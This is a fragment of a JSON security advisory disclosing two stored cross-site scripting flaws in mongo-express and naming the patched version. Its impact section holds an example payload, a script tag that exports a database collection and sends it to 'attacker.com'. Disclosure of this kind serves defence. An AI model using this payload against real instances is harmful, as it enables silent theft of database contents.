  ],
  "summary": "Cross-site scripting",
  "details": "Two kinds of XSS were found:\n\n1.  As mentioned in https://github.com/mongo-express/mongo-express/issues/577 when the content of a cell grows larger than supported size, clicking on a row will show full document unescaped, however this needs admin interaction on cell.\n2. Data cells identified as media will be rendered as media, without being sanitized. Example of different renders: image, audio, video, etc.\n\n\n\n### Impact\nAs an example of type 1 attack, an unauthorized user who only can send a large amount of data in a field of a document may use this payload:\n```JSON\n{\"someField\": \"long string here to surpass the limit of document ...... <script> await fetch('http://localhost:8081/db/testdb/export/users').then( async res =>  await fetch('http://attacker.com?backup='+encodeURIComponent((await res.text())))) </script>\"  }\n```\nThis will send an export of a collection to the attacker without even admin knowing. Other types of attacks such as dropping a database\\collection are also possible.\n\n### Patches\nUpgrade to  `v1.0.0-alpha.4`\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [mongo-express](https://github.com/mongo-express/mongo-express/issues/new)\n* Email me at [jafar.akhoondali@gmail.com](mailto:jafar.akhoondali@gmail.com)\n",
